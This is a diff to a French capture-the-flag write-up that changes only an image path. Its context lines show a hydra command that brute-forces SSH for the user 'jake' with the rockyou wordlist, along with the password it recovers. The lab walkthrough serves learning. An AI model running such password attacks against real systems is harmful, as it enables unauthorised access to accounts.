@@ -88,7 +88,7 @@ Forts de l'indice trouvé dans la note FTP ("mot de passe très simple" pour l'u
 hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP_SERVEUR>/ -f 
 ```
 
-![Résultat Hydra](static/images/hydra3.png)
+![](/images/hydra3.png)
 
 Succès ! Hydra trouve rapidement le mot de passe : `987654321`.
 
